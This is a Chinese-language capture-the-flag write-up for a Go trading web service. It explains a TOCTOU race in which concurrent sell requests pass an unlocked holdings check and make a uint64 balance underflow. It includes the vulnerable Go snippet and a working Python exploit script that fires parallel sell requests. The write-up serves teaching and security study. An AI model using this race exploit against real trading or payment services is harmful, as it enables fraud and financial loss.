# Hft

## 题目简述

题目提供一个实时交易 `$FLAG` 的 Go Web 服务。启动 challenge 后，玩家和自动交易机器人各有一个共享内存账户；30 个价格 tick 后，玩家现金显著超过机器人即可得到 flag。`Buy`、`Sell` 和账户查询都直接操作同一个 `*Account`，没有锁，因而可以用并发卖单绕过持仓检查并让无符号持仓下溢。

## 解题过程

卖出函数先检查 `amount <= acc.Flag`，之后才计算价格并执行扣减：

```go
if amount > acc.Flag {
    return "", errors.New("insufficient funds")
}

profit, err := safemath.SafeMultiplyWithFees(...)
acc.Cash += profit
acc.Flag -= amount
```

这些步骤没有互斥。先购买 5 单位持仓，再同时发送 10 个“卖出 1”的请求。选择较高价格时，`safeMultiply` 的逐次加法会放大检查与扣减之间的时间窗口，使多个请求都在持仓仍大于零时通过检查；之后的扣减超过 5 次，`uint64` 持仓回绕到接近 $2^{64}$。

随后出售 $2^{31}$ 单位即可获得远超机器人的现金。官方脚本的主线为：

```python
import time
from concurrent.futures import ThreadPoolExecutor

import requests

base = "https://target.example"
account = requests.post(base + "/challenge").text.strip()


def trade(operation: int, amount: int):
    return requests.post(
        f"{base}/{account}/trade",
        json={"op": operation, "amt": amount},
    )


trade(0, 5)

while requests.get(base + "/query").json()["price"] < 10**7:
    time.sleep(1)

with ThreadPoolExecutor(max_workers=10) as pool:
    futures = [pool.submit(trade, 1, 1) for _ in range(10)]
    for future in futures:
        future.result()

state = requests.get(f"{base}/{account}").json()
assert state["flag"] > 2**32

trade(1, 2**31)
time.sleep(15)
print(requests.get(f"{base}/{account}").json()["message"])
```

挑战结算逻辑虽然用循环比较玩家现金与机器人现金的倍数，但巨额卖出收益足以满足条件，最终消息包含：

```text
grey{race_condition_is_not_stonks}
```

## 方法总结

- 核心技巧：对共享账户并发提交通过检查的卖单，制造 TOCTOU 并让 `uint64` 持仓下溢。
- 识别信号：Web handler 取得共享对象指针后执行“检查—耗时计算—修改”，但没有锁或事务，是典型竞态窗口。
- 复用要点：竞态利用要主动扩大临界窗口，并等待全部并发请求完成后再验证状态；不要只依赖偶发时序。
